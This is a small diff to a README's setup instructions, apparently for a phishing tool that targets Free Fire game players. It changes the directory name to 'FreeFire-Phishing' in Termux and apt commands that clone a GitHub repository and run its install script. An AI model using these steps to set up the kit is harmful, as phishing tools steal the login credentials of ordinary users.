@@ -65,7 +65,7 @@ pkg update -y
 pkg upgrade -y
 pkg install git 
 git clone https://github.com/TellHack/ffsh
-cd ffsh
+cd FreeFire-Phishing
 chmod +x *
 bash install
 ```
@@ -75,7 +75,7 @@ sudo apt update -y
 sudo apt upgrade -y
 sudo apt install git 
 git clone  https://github.com/TellHack/ffsh
-cd ffsh
+cd FreeFire-Phishing
 chmod +x *
 bash install 
 ```
